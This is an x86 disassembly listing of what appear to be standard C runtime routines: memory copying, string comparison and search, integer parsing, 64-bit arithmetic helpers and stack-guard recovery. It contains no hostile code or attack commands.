  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
